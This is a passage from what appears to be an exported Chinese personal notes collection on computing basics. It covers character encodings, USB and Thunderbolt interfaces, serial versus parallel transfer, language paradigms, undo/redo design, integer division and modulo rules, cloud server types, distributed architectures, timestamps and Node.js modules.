只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。\n比如，汉字严的 Unicode 是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说，这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。\n这里就有两个严重的问题，第一个问题是，如何才能区别 Unicode 和 ASCII ？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果 Unicode 统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。\n它们造成的结果是：1）出现了 Unicode 的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示 Unicode。2）Unicode 在很长一段时间内无法推广，直到互联网的出现。\n\n> Unicode 只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。而对数字码的存储规则的定义则需要依靠UTF-8/UTF-16/UTF-32， UTF-8/UTF-16/UTF-32是通过Unicode码值进行对应规则转换后，编码保存到内存/文件中。UTF-8/UTF-16都是可变长的编码方式\n\n### UTF-32\n这个最简单，就是将Unicode字符集对应的码位直接以整数二进制存储，占四个字节\n但有个细节，就是字节的排列顺序，如果第一个字节是整数二进制中的最高位，最后一个字节是整数二进制中的最低位，那这种字节序就叫”大端” (Big Endian, BE） ，否则，正好相反的情况，就叫”小端”(Little Endian, LE)。对应的编码方式分别是UTF-32BE和UIF-32LE。 比如:\n|Unicode编码|UTF32-LE|UTF32-BE|\n|--|--|--|\n|0x006C49|49 6C 00 00|00 00 6C 49|\n|0x020C30|30 0C 02 00|00 02 OC 30|\n\n>注意：之所以有大端和小端两种方式，是因为硬件读写顺序的不同。\n大端：数据的高字节保存在内存的低地址中，低字节保存到内存的高地址中，和我们的阅读习惯一致；小端则相反，常用的x86结构是小端模式。采用大端方式进行数据存放符合人类的正常思维，而采用小端方式进行数据存放利于计算机处理。\n\n可以看出，每个字符都用四个字节表示，非常浪费空间，实际采用的也比较少\n\n> 注意：\n- UTF-32是因为UTF-16编码方式不能表示全部的字符而扩充的编码方式\n- UTF-16比UTF-32节省了很多空间，但是任何一个字符都至少需要两个字节表示，对于美国和西欧国家而言，还是很浪费\n- UTF-8和UTF-32/UTF-16不同的地方是UTF-8是兼容Ascii的，对大部分中文而言，一个中文字符需要用三个字节表示。UTF-8的优势是网络上数据传输英文字符只需要1个字节，可以节省带完资源。所以当前大部分的网络应用都使用UTF-8编码，因为网络应用的代码编写全部都是使用的英文编写，占据空间小，网络传输速度快。\n\n### 编码表汇总\n我们简单汇总一下上面的内容。ASCII码是基础，一个字节表示，最高位设为0，其他7位表示128个字符。除了utf-16/utf-32之外，其他编码**都是**兼容AscII的，最高位使用1来进行区分。西欧主要使用Windows-1252，使用一个字节，增加了额外128个字符。中文大陆地区的三个主要编码GB2312，GBK, GB18030，有时间先后关系，表示的字符数越来越多，且后面的兼容前面的，GB2312和GBK都是用两个字节表示，而GB18030则使用两个或四个字节表示。香港台湾地区的主要编码是Big5。\n如果文本里的字符都是AsCII码字符，那么采用以上所说的任一编码方式都是一样的，不会乱码。但如果有高位为1的字符，**除了GB2312/GBK/GB18030外，其他编码之间都是不兼容的**，比如，Windows-1252和中文的各种编码是不兼容的，即使Big5和GB18030都能表示繁体字，其表示方式也是不一样的，而这就会出现所谓的乱码。\n\n- 除了utf-16/utf-32之外，任何编码都与ASCII编码兼容\n- 除了GB2312/GBK/GB18030之外的其他编码之间都是不兼容的\n\n## 乱码与兼容\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093937.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405093949.png)\n\n### 乱码的原因和可逆性\n#### 乱码的原因\n乱码产生的根源一般情况下可以归结为三方面即：\n- 编码引起的乱码\n- 解码引起的乱码以及缺少某种字体库引起的乱码（这种情况需要用户安装对应的字体库），\n- 其中大部分乱码问题是由不合适的解码方式造成的\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094001.png)\n\n# 设备数据传输\n注意把传输接口与传输协议区别开来，设备间的数据传输是由它们之间共同完成的\n\n## 传输接口\n### Type-A、Type-B、Type-C。\nType-A、Type-B、Type-C接口类型常使用USB协议。Type-A与Type-B按体积大小还可以分为Standard标准、Mini小型、Micro微型三种类型, 而Type-C只有一种外形\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094015.png)\n\n#### Type-A\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094030.png)\n\n##### 标准 Type-A\n标准USB Type-A还可以分为USB 2.0 4金属触点版本和USB 3.0 9金属触点版本。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094046.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094059.png)\n\n#### Type-B\n- Micro Type-B\n- USB3.0 Micro Type-B\n- 标准 Type-B\n- Mini Type-B\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094113.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094127.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094138.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094150.png)\n\n#### Type-C\nType-C只有一种外形\n> 在新一代的USB4协议中，Type-C是唯一支持的接口\n\n### DP、Mini DP\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094203.png)\n\n## 传输协议\n### USB协议\nUSB全称为Universal Serial Bus，是1994年由英特尔与微软倡导发起成立的USB标准化组织(简称为USB-IF)指定的，\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094215.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094228.png)\n\n### 雷电协议\n雷电协议是英特尔与苹果合作开发的，雷电1、雷电2协议用于的接口不是Type-C接口而是Mini Dp接口，直到雷电3协议后才使用Type-C接口\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094247.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220405094302.png)\n\n# 了解计算机的启动过程\n<div class='container'>\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/tQdpxzIqdDM\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n# 芯片\n芯片是一种集成电路。集成电路，英文为Integrated Circuit, 缩写为IC；顾名思义，就是把一定数量的常用电子元件，如电阻、电容、晶体管等，以及这些元件之间的连线，通过半导体工艺集成在一起的具有特定功能的电路\n\n<div class='container'>\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/t2qVkbzMZlE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n# 串行与并行\n一条信息的各位数据被逐位按顺序传送的通讯方式称为串行通讯。串行通讯的特点是：数据位传送，传按位顺序进行，最少只需一根传输线即可完成，成本低但送速度慢。串行通讯的距离可以从几米到几千米。 根据信息的传送方向，串行通讯可以进一步分为单工、半双工和全双工三种。信息只能单向传送为单工；信息能双向传送但不能同时双向传送称为半双工；信息能够同时双向传送则称为全双工\n\n串行通讯中，两个设备之间通过一对信号线进行通讯，其中一根为信号线，另外一根为信号地线，信号电流通过信号线到达目标设备，再经过信号地线返回，构成一个信号回路。\n\n初级读者会产生疑问：为何不让信号电流从电源地线返回？答案：公共地线上存在各种杂乱的电流，可以轻而易举地把信号淹没。因此所有的信号线都使用信号地线而不是电源地线，以避免干扰。\n\n这一对信号线每次只传送1bit（比特）的信号，比如1Byte（字节）的信号需要8次才能发完。传输的信号可以是数据、指令或者控制信号，这取决于采用的是何种通讯协议以及传输状态。串行信号本身也可以带有时钟信息，并且可以通过算法校正时钟。因此不需要额外的时钟信号进行控制。\n\n并行通讯中，基本原理与串行通讯没有区别。只不过使用了成倍的信号线路，从而一次可以传送更多bit的信号。\n\n并行通讯通常可以一次传送8bit、16bit、32bit甚至更高的位数，相应地就需要8根、16根、32根信号线，同时需要加入更多的信号地线。比如传统的PATA线路有40根线，其中有16根信号线和7根信号地线，其他为各种控制线，一次可以传送2Byte的数据。并行通讯中，数据信号中无法携带时钟信息，为了保证各对信号线上的信号时序一致，并行设备需要严格同步时钟信号，或者采用额外的时钟信号线。\n\n通过串行通讯与并行通讯的对比，可以看出：串行通讯很简单，但是相对速度低；并行通讯比较复杂，但是相对速度高。更重要的是，串行线路仅使用一对信号线，线路成本低并且抗干扰能力强，因此可以用在长距离通讯上；而并行线路使用多对信号线（还不包括额外的控制线路），线路成本高并且抗干扰能力差，因此对通讯距离有非常严格的限制。\n\n> 需要注意的是，显卡底部的金手指，外形很像并行总线，但实际上是一种串行总线。串行总线可以做多链路传输，和并行链路不一样，它的每根链路是独立数据，相互之间没有关系，不会受到其他数据的干扰\n\n# SOC与SIP\n## SOC\nSystem on Chip，简称SoC， SoC称为系统级芯片，也有称片上系统。从狭义角度讲，它是信息系统核心的芯片集成，是将系统关键部件集成在一块芯片上;从广义角度讲， SoC是一个微小型系统，如果说中央处理器(CPU)是大脑，那么SoC就是包括大脑、心脏、眼睛和手的系统。国内外学术界一般倾向将SoC定义为将微处理器、模拟IP核、数字IP核和存储器(或片外存储控制接口)集成在单一芯片上，它通常是客户定制的，或是面向特定用途的标准产品。\n\n## SIP\nSystem in a Package，简称为SIP, SIP称为系统化封装，相比于SoC的集成度，sip还可以集成DDR，将处理器和存储器等功能芯片〈裸片〉甚至可以说是sip=SoC+DDR。\n"
  },
  {
    "title": "./notes/基础知识/计算机常识.md",
    "body": "# 计算机编程语言的分类\n## 计算机编程语言的分类\n- 机器语言（二进制代码）\n- 汇编语言（面向机器的程序设计语言）\n- 高级语言\n\t- 按转换方式可分为两类：1.编译型语言;  2.解释型语言\n\t- 按照客观系统的描述可分为两类：1.面向过程语言;  2.面向对象语言    \n\t- 按照编程范型可分为：1.命令式语言;  2.函数式语言;  3.逻辑式语言;  4.面向对象语言\n\n## 三种语言的优缺点：\n### 机器语言：\n可读性、可移植性差，编程繁杂。\n直接执行，速度快，资源占用少；\n### 汇编语言：\n不同的处理器有不同的汇编语言语法和编译器，编译的程序无法在不同的处理器上执行，缺乏可移植性，难于从汇编语言代码上理解程序设计意图，可维护性差，即使是完成简单的工作也需要大量的汇编语言代码，很容易产生bug，难于调试，使用汇编语言必须对某种处理器非常了解，而且只能针对特定的体系结构和处理器进行优化，开发效率很低，周期长且单调。\n能够保持机器语言的一致性，直接、简捷，并能像机器指令一样访问、控制计算机的各种硬件设备，如磁盘、存储器、CPU、I/O端口等。使用汇编语言，可以访问所有能够被访问的软、硬件资源，目标代码简短，占用内存少，执行速度快。\n### 高级语言：\n运行速度基本上比直接用汇编写的慢，速度和程序大小与编译软件有关。\n高级语言接近算法语言，易学、易掌握，级语言为程序员提供了结构化程序设计的环境和工具，使得设计出来的程序可读性好，可维护性强，可靠性高；高级语言远离机器语言，与具体的计算机硬件关系不大，可移植性好，重用率高；由于把繁杂琐碎的事务交给了编译程序去做，所以自动化程度高，开发周期短，且程序员得到解脱，可以集中时间和精力去从事对于他们来说更为重要的创造性劳动，以提高程序的质量。\n\n## 高级语言的分类：\n### 按转换方式可分为两类：1.编译型语言;  2.解释型语言\n1.编译型语言：\n编译性语言写的程序在被执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如exe文件，以后要运行的话就不用重新翻译了，直接使用编译的结果就行了（exe文件），因为翻译只做了一次，运行时不需要翻译，所以编译型语言的程序执行效率高。\n2.解释型语言： \n解释性语言的程序不需要编译，在运行程序的时候才翻译，每个语句都是执行的时候才翻译。这样解释性语言每执行一次就需要逐行翻译一次，效率比较低。\n现代解释性语言通常把源程序编译成中间代码，然后用解释器把中间代码一条条翻译成目标机器代码，一条条执行。\n\n关于脚本语言：\n脚本语言是一种解释性的语言，脚本语言是为了缩短传统的编写-编译-链接-运行（edit-compile-link-run）过程而创建的计算机编程语言。脚本语言一般都 有相应的脚本引擎来解释执行。 他们一般需要解释器才能运行。一个脚本通常是解释运行而非编译。脚本语言通常都有简单、易学、易用的特性，目的就是希望能让程序员快速完成程序的编写工作。而宏语言则可视为脚本语言的分支，两者也有实质上的相同之处。脚本语言一般都是以文本形式存在,类似于一种命令。\n\n举例：\n- 解释性语言：Java、JavaScript、Perl、Python、Ruby、MATLAB 等。\n- 编译性语言： C/C++、Pascal/Object Pascal（Delphi)\n- 脚本语言：Python、JavaScript，ASP，PHP，Perl等\n\n### 按照客观系统的描述可分为两类：1.面向过程语言;  2.面向对象语言\n1.面向过程语言：\n面向过程语言是以过程或函数为基础的，这种语言对底层硬件，内存等操作比较方便，但是写代码和调试维护等会很麻烦。例如：c语言\n2.面向对象语言：\n面向对象语言（Object-Oriented Language）是一类以对象作为基本程序结构单位的程序设计语言，指用于描述的设计是以对象为核心，而对象是程序运行时刻的基本成分。语言中提供了类、继承等成分。\n面向对象语言的发展有两个方向：一种是纯面向对象语言，如Smalltalk、EIFFEL等；另一种是混合型面向对象语言，即在过程式语言及其它语言中加入类、继承等成分，如C++、Objective-C等\n\n### 按照编程范型可分为：1.命令式语言;  2.函数式语言;  3.逻辑式语言;  4.面向对象语言\n1.命令式语言：\n命令式程序设计语言是基于动作的语言，以冯诺依曼计算机体系结构为背景。机器语言及汇编语言是最早的命令式语言。在这种语言中，计算机被看做是动作的序列，程序就是用语言提供的操作命令书写的一个操作序列。用命令式程序设计语言编写程序，就是描述解题过程中每一步的过程，程序的运行过程就是问题的求解过程，因此也称为过程式语言。Fortran、ALGOL、COBOL、C、Ada、Pascal等都是命令式程序设计语言。\n2.函数式语言：\n函数式编程是种编程典范，它将电脑运算视为函数的计算。函数编程语言最重要的基础是 λ 演算（lambda calculus）。而且λ演算的函数可以接受函数当作输入（参数）和输出（返回值）。和指令式编程相比，函数式编程强调函数的计算比指令的执行重要。和过程化编程相比，函数式编程里，函数的计算可随时调用。这种语言的语义基础是基于数学函数概念的值映射的λ算子可计算模型。这种语言非常适合于进行人工智能等工作的计算。典型的函数式语言如 Lisp、Haskell、ML、Scheme 、F#等。\n3.逻辑式语言：\n这种语言的语义基础是基于一组已知规则的形式逻辑系统。这种语言主要用在专家系统的实现中。最著名的逻辑式语言是 Prolog。\n4.面向对象语言：\n现代语言中的大多数都提供面向对象的支持，但有些语言是直接建立在面向对象基本模型上的，语言的语法形式的语义就是基本对象操作。主要的纯面向对象语言是 Smalltalk。\n\n# 向下兼容与向上兼容\n向下兼容指的是高版本支持低版本的或者说后期开发的版本支持和兼容早期开发的版本，\n向上兼容的很少，大多数软件都是向下兼容的。\n向上向下和向前向后是一样的，向上和向下是相对的，\n对于软件来说，向下兼容的意思是，较高版本的程序能顺利处理较低版本程序的数据，\n硬件也是如此了，新的产品支持旧产品（向下兼容），\n当然这时旧产品是得到新产品的支持，对旧产品来说，它是向上兼容的，\n能不能兼容是新产品说的算。\n\n# 软件版本号命名规范\n## 总原则\n- 标准的版本号必须采用XYZ的格式，并且X、Y 和 Z 为非负的整数，禁止在数字前方补零\n- 版本是严格递增的，此处是：16.2.0 -> 16.3.0 -> 16.3.1\n- 在发布重要版本时，可以发布alpha, rc等先行版本\n- alpha和rc等修饰版本的关键字后面可以带上次数和meta信息\n- 版本的优先层级指的是不同版本在排序时如何比较。判断优先层级时，必须把版本依序拆分为`主版本号`、`次版本号`、`修订号`及`先行版本号`后进行比较。\n\n## 软件版本阶段说明\n- Alpha版: 此版本表示该软件在此阶段主要是以实现软件功能为主，通常只在软件开发者内部交流，一般而言，该版本软件的Bug较多，需要继续修改。\n- Beta版: 该版本相对于α版已有了很大的改进，消除了严重的错误，但还是存在着一些缺陷，需要经过多次测试来进一步消除，此版本主要的修改对像是软件的UI。\n- RC版: 该版本已经相当成熟了，基本上不存在导致错误的BUG，与即将发行的正式版相差无几。\n- Release版: 该版本意味“最终版本”，在前面版本的一系列测试版之后，终归会有一个正式版本，是最终交付用户使用的一个版本。该版本有时也称为标准版。一般情况下，Release不会以单词形式出现在软件封面上，取而代之的是符号®。\n\n# 编辑器的撤销和重做如何实现\n我一直好奇，编辑器的undo和redo是如何实现的，而且因为不了解uodo和redo工作原理到底是怎样的。常常会发现它并不能我所想的去工作。\n\n这篇文章用一种模型解释undo和redo，我在编辑器上试过这种思路是没问题的，但我不能把握这种模型一定是对的，如果在以后的学习中发现还有问题，我会进一步修改。\n\n清晰的思路\n首先要明白，为什么有的时候我们点击redo是没用的，<font color=\"red\">因为只有undo的才能redo，你在一个新操作上redo是没用的</font>。\n\n而且，虽然看上去在操作过程中，我们是在保存每一次的状态，但是在底层实现中，程序员是不会蠢到把每一次的缓冲区都保存为状态，真实情况就是只保存变化。这还真算是编程里面的一个范式了。版本管理器的原理也是如此。\n\n还有我们要明白，任何一个操作都是可以被反转义为一个逆操作。比如“在xxx位置插入”abc”字符”的逆操作就是“将xxx位置到len（”abc”）长度的字符删除”。\n\n## 构建模型\nundo和redo的模型类似于下图:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409163344.png)\n\n我们的每一次操作，就被放到一个类似栈的容器中（说类似，是因为它的属性和栈并不完全相同）。我们把编辑器底层维护的这块字符内存成为缓冲区，而在栈中存放的都是类似的操作：\n```\n在缓冲区的xx位置插入\"abc\"。\n将缓冲区xx到yy位置的字符串删除。\n......\n```\n\n## 分析操作\n对缓冲区进行新的操作（current指针在栈顶）。当进行一个新的操作时，会将这个操作压栈。并将一个current指针指向它。\n\n### undo撤销\n当我们撤销操作时，会将current指向的操作，做一个反转义，将生成的逆向操作在缓冲区中执行，并将current向栈底的移动一位。（注意，刚才的那个操作并没有出栈，只是移动current指针而已）\n\n### redo重做\n当我们重做操作时，会将current指针栈顶的方向移动一位，并将指向的操作在缓冲区中执行。对缓冲区进行新的操作(current指针不在栈顶)\n\n那么如果我们在uodo几次后，直接对缓冲区直接进行操作呢？\n这时将对current上方的所有操作出栈，将新的操作压栈，并将current指针指向它。\n这也就是为什么，你在这时，redo操作是没用的。因为栈顶已经没东西了。\n\n\n# 算术运算与逻辑运输\n- 算术运算指令会考虑将操作数看做是一个有符号的数，在运算时要考虑正数和负数的这个性质。即符号位不\n- 逻辑运算指令是将操作数视为一组二进制的01串，这就不存在正数或着负数这样的概念\n\n程序代码中的`^, &, |, ~`都是逻辑运输, `<<, >>`是算术运算\n\n# 取整问题\n- 向上取整：比自己大的最小整数；\n- 向下取整：比自己小的最大整数；\n- 向0取整: 即如果是正数时：向下取整；如果是负数时：向上取整\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20211223110250.png)\n\n## java/c/c++默认是向0取整\njava:\n```java\n1  / 2  => 0\n-1 / 2  => 0\n```\n\nc/c++:\n```c\n1  / 2  => 0\n-1 / 2  => 0\n```\n\n## python3默认是向下取整\npython3:\n```python\n1  /  2   => 0.5\n1  // 2   => 0\n-1 /  2   => -0.5\n-1 //  2  => -1\n```\n\n## js中没有整除运算符\njs:\n```js\n1   /  2   => 0.5\n-1  /  2   => -0.5\n```\n\n# 负数取模怎么算\n参考：\n- https://www.jianshu.com/p/452c1a5acd31  \n- https://segmentfault.com/a/1190000015581794\n\n---\n\n## 取模怎么算\n取模运算实际上是计算两数相除以后的余数。假设 q 是 a、b 相除产生的商(quotient)，r 是相应的余数(remainder)，那么在几乎所有的计算系统中，都满足：`a = b x q + r`，其中 `|r|<|a|`。因此 r 有两个选择，一个为正，一个为负;相应的，q 也有两个选择。如果a、b 都是正数的话，那么一般的编程语言中，r 为正数；或者如果 a、b 都是负数的话，一般 r 为负数。但是如果 a、b 一正一负的话，不同的语言则会根据除法的不同结果而使得 r 的结果也不同，但是一般 r 的计算方法都会满足：`r = a - (a / b) x b`\n\n## 计算机怎么算\n计算机怎么算，并不是一个好回答的问题，因为不同语言里面，对于整数除法取整的处理方式并不一样。\n- C/Java 的处理方式\n  - 大多数语言的处理方式都与 C/Java 一致，采用了 truncate 除法。所以在 C/Java 语言中:\n  - -17 % 10 的计算结果如下：r = (-17) - (-17 / 10) x 10 = (-17) - (-1 x 10) = -7\n  - 17 % -10 的计算结果如下：r = 17 - (17 / -10) x (-10) = (17) - (-1 x -10) = 7\n  - -17 % -10 的计算结果如下：r = (-17) - (-17 / -10) x (-10) = (-17) - (1 x -10) = -7\n\n- Python 的处理方式\n  - Python 语言除法采用的是 floor 除法，所以对 Python 程序员来讲：\n  - -17 % 10 的计算结果如下：r = (-17) - (-17 / 10) x 10 = (-17) - (-2 x 10) = 3\n  - 17 % -10 的计算结果如下：r = 17 - (17 / -10) x (-10) = (17) - (-2 x -10) = －3\n  - -17 % -10 的计算结果如下：r = (-17) - (-17 / -10) x (-10) = (-17) - (1 x -10) = -7\n  - 据说，Python 3.x 中「/」运算符的意义发生了变化，「/」产生的结果将不会再进行取整，相应的「//」运算符的结果才会进行取整。\n\n- Common Lisp 的处理方式\n  - Common Lisp 的特殊操作符「/」的结果是分数，因此不会存在截尾的问题。但是 Common Lisp 提供了 TRUNCATE 函数和 FLOOR 函数分别对应上述的两种除法。相应的，Common Lisp 的 REM 函数类似于 C/Java 语言中的取模运算；而 MOD 函数类似于 Python 语言中的取模运算。\n  - 例如，在 Clojure 这门 Lisp 方言中，(rem -17 10) == -7，(mod -17 10) == 3\n\n\n# 轻量应用服务器与ESC的区别\n区别：\n- 轻量应用服务器面向单机应用，云服务器ECS则未做任何限制。\n- 轻量应用服务器的可扩展性差，云服务器ECS的可扩展性好。\n- 轻量应用服务器基本不存在网络的扩展问题；云服务器ECS在专有网络VPC下，用户可以自定义专有网络。\n\n## 轻量应用服务器\n轻量应用服务器：面向单机应用场景的新一代计算服务，提供应用一键部署、一站式域名解析、网站发布、安全、运维、应用管理等服务。极大地优化了搭建简单应用的体验，降低了入门级用户使用云计算产品的门槛。\n\n套餐资源包括：\n- 由阿里云精选的常用应用镜像和系统镜像；\n- 云服务器计算资源，包括基于 SSD 的存储资源、网络资源；\n- 阿里云其他产品的基础功能（DNS，VPC 等）\n\n简单理解，轻量应用服务器跟我们之前使用的虚拟主机类似，主要用于部署网站来使用，跟虚拟主机不同的是轻量应用服务器底层是云服务器，操作系统包含运行环境，上传程序即可使用。\n\n## 云服务器\n云服务器（Elastic Compute Service，简称ECS）：阿里云提供的性能卓越、稳定可靠、弹性扩展的IaaS（Infrastructure as a Service）级别云计算服务。\n\n从定义中不难看出，轻量应用服务器和云服务器ECS主要有以下几个方面不同：\n- 使用对象：轻量应用服务器面向单机应用，云服务器ECS则未做任何限制；\n- 可扩展性：轻量应用服务器提供的配置仅有少量的几个可供选择，升配局限较大；云服务器ECS提供数十种类型上百种配置可供选择，并且支持升级，同时ECS支持搭配其他应用如RDS、OSS来使用；\n- 网络：轻量应用服务器面向对象是单机，基本不存在网络的扩展问题；云服务器ECS在专有网络VPC下，用户可以自定义专有网络，并且可以通过网络与线下IDC或者其他云产品进行互联互通；\n\n## 应用镜像和系统镜像\n应用镜像和系统镜像是阿里云轻量应用服务器特有的：系统镜像是指纯净版的操作系统，应用镜像是在原操作系统基础上另外安装了WordPress、LAMP、Drupal、Node.js、ECShop、phpwind、ASP/.NET 4.0及BT-Panel等镜像。\n\n如果应用镜像中有所需镜像，选择应用镜像更方便，不需要自行手动安装程序；如果喜欢自己搭建环境，可以选择系统镜像。\n\n如果是云服务器一般推荐选择安装系统镜像，安装纯净的操作系统，这样的话操作系统是纯净的未安装过任何环境和程序的，这样的话，环境我们可以自己创建，自由度更好。\n\n# VR, AR, MR\n- VR:看到的都是假的，把意识带入虚拟场景。\n- AR:看到的一部分真，一部分假，把虚拟信息带入现实世界。\n- MR:全息与真实世界完美契合，可以实现互动。\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/eCfqY9O2v8Y\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n# 集群、分布式、微服务\n## 集群\n集群是指在几个服务器上部署相同的应用程序来分担客户端的请求。它是同一个系统部署在不同的服务器上，比如一个登陆系统部署在不同的服务器上。好比 多个人一起做同样的事。\n\n集群主要的使用场景是为了分担请求的压力。\n\n但是，当压力进一步增大的时候，可能在需要存储的部分，比如mysql无法面对大量的“写压力”。\n\n因为在mysql做成集群之后，主要的写压力还是在master的机器上，其他slave机器无法分担写压力，这时，就引出了“分布式”。\n\n## 分布式\n分布式的核心就一个字：拆。只要是将一个项目拆分成了多个模块，并将这些模块分开部署，那就算是分布式。\n\n如何拆呢？有两种方式：水平拆分，或垂直拆分（也称为“横向拆分”和“垂直拆分”），具体如下：\n\n**水平拆分**：根据“分层”的思想进行拆分。例如，可以将一个项目根据“三层架构”拆分成 表示层（jsp+servlet）、业务逻辑层（service）和数据访问层（dao），然后再分开部署：把表示层部署在服务器A上，把service和dao层部署在服务器B上，然后服务器A和服务器B之间通过dubbo等RPC进行进行整合（在左下角的“阅读原文”里有dubbo的视频课程，可以点击学习），如图所示。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122345.png)\n\n**垂直拆分**：根据业务进行拆分。例如，可以根据业务逻辑，将“电商项目”拆分成“订单项目”、“用户项目”和“秒杀项目”。显然这三个拆分后的项目，仍然可以作为独立的项目使用。像这种拆分的方法，就成为垂直拆分。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122356.png)\n\n## 微服务\n从名字就能知道，“微服务”就是非常微小的服务。\n\n微服务可以理解为一种非常细粒度的垂直拆分。例如，以上“订单项目”本来就是垂直拆分后的子项目，但实际上“订单项目”还能进一步拆分为“购物项目”、“结算项目”和“售后项目”，如图。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122406.png)\n\n现在看图中的“订单项目”，它完全可以作为一个分布式项目的组成元素，但就不适合作为微服务的组成元素了（因为它还能再拆，而微服务应该是不能再拆的“微小”服务，类似于“原子性”）。\n\n## 总结：\n- 集群: 把处理同一个业务的系统部署多个节点\n- 分布式：拆了就行。\n- 微服务：细粒度的垂直拆分。\n\n# 横向扩展、纵向扩展\n为了搞懂什么是横向扩展与纵向扩展，我们可以先搞懂什么是`横向发展`与`纵向发展`\n\n- 横向发展: 就是拓宽工作范围,各项工作齐头并进；\n- 纵向发展: 就是让某一工作逐渐深入,力求抓出成效.\n\n由此可以引导出什么是横向扩展与纵向扩展\n\n- 横向扩展：多增加几台API服务器，一起服务。\n- 纵向扩展：把API服务器换成性能更好的机器。\n\n- 横向扩展 也叫 水平扩展，用更多的节点支撑更大量的请求。 如成千上万的蚂蚁完成一项搬运工作\n- 纵向扩展 又叫 垂直扩展，扩展一个点的能力支撑更大的请求。如利用1个人的能力，如蜘蛛侠逼停火车\n\n# 时区和时间戳\n## 时区和时间戳\n什么是时间戳（timestamp）？它和时区（timezone）又有什么关系？初学者可能一开始很难搞懂时间戳这个概念，就像这期《程序员的日常》漫画中的主人公一样。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220712184342.png)\n\n从漫画中举的例子来看，这里的时间戳，指的就是Unix时间戳(Unix timestamp)。它也被称为Unix时间(Unix time)、POSIX时间(POSIX time)，是一种时间表示方式，定义为从格林威治时间1970年01月01日00时00分00秒起至现在的总秒数。因此，严格来说，不管你处在地球上的哪个地方，任意时间点的时间戳都是相同的。这点有利于线上和客户端分布式应用统一追踪时间信息。\n\nUnix时间戳不仅被使用在Unix系统、类Unix系统中，也在许多其他操作系统中被广泛采用。但是，这并不意味着目前的时间戳规范会一直持续使用下去。因为到2038年1月19日时，Unix时间戳就会因为32位内存溢出（32-bit overflow）而无法继续使用。因此，在这一天之前，上千万的网络应用要么采用新的时间戳规范，要么迁移到64位系统，后者可以给时间戳争取“一点”时间。\n\n## 格林威治时间（GMT）\nGMT时间就是英国格林威治时间，也就是世界标准时间\n\n## 协调世界时（UTC）\n协调世界时（英语：Coordinated Universal Time简称UTC）是最主要的世界时间标准，其以原子时秒长为基础，在时刻上尽量接近于格林尼治标准时间。\n\n协调世界时是世界上调节时钟和时间的主要时间标准，它与0度经线的平太阳时相差不超过1秒，并不遵守夏令时。协调世界时是最接近格林威治标准时间（GMT）的几个替代时间系统之一。对于大多数用途来说，UTC时间被认为能与GMT时间互换，但GMT时间已不再被科学界所确定。\n"
  },
  {
    "title": "./notes/基础知识/node.md",
    "body": "# node简介\n安装node后，自带npm\n对于Node而言，NPM(Node Package Manager)帮助其完成了第三方模块的发布、安装和依赖等。借助NPM，Node与第三方模块之间形成了很好的一个生态系统。\n\n## 模块化 \n**基本概念**\n在nodejs中，应用由模块组成，nodejs中采用commonJS模块规范。\n- 一个js文件就是一个模块\n-  每个模块都是一个独立的作用域，在这个文件中定义的变量、函数、对象都是私有的，对其他文件不可见。\n\n**node中模块分类**\n- 核心模块: 由 node 本身提供，不需要单独安装（npm），可直接引入使用\n- 第三方模块: 由社区或个人提供，需要通过npm安装后使用\n- 自定义模块: 由我们自己创建，比如：tool.js 、 user.js\n\n**常见核心模块**\n- fs：文件操作模块\n- http：网络操作模块\n- path：路径操作模块\n- url: 解析地址的模块\n- querystring: 解析参数字符串的模块\n\n**模块导入**\n- 通过require(\"fs\")来加载模块\n- 如果是第三方模块，需要先使用npm进行下载\n- 如果是自定义模块，需要加上相对路径./或者../,可以省略.js后缀，如果文件名是index.js那么index.js也可以省略。\n- 模块可以被多次加载，但是只会在第一次加载\n\n**模块导出**\n在模块的内部，module变量代表的就是当前模块，它的exports属性就是对外的接口，加载某个模块，加载的就是module.exports属性，这个属性指向一个空的对象。\n```js\n//module.exports指向的是一个对象，我们给对象增加属性即可。\n//module.exports.num = 